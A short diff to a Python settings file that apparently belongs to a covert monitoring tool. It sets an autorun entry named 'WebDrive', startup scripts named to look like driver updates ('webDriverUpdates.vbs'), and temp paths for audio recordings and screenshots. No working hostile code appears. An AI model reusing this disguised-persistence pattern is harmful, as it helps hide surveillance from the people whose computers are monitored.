@@ -2,10 +2,14 @@ import os
 import tempfile
 
 BASE_DIR = os.path.dirname(os.path.realpath(__file__))
-TEMP_DIR = tempfile.gettempdir()
+PC_TEMP_DIR = tempfile.gettempdir()
+PROJECT_TEMP_DIR = os.path.join(BASE_DIR, "temp")
+
+PYTHON_VENV_PATH = os.path.join("venv", "Scripts", "python.exe")
 
 AUTORUN_NAME = "WebDrive"
-RUN_FILENAME = "start.bat"
+BAT_FILENAME = "webDriver.bat"
+RUN_FILENAME = "webDriverUpdates.vbs"
 
-RECORD_PATH = os.path.join(TEMP_DIR, "sound.wav")
-SCREENSHOT_PATH = os.path.join(TEMP_DIR, "screenshot.jpg")
+RECORD_PATH = os.path.join(PC_TEMP_DIR, "sound.wav")
+SCREENSHOT_PATH = os.path.join(PC_TEMP_DIR, "screenshot.jpg")
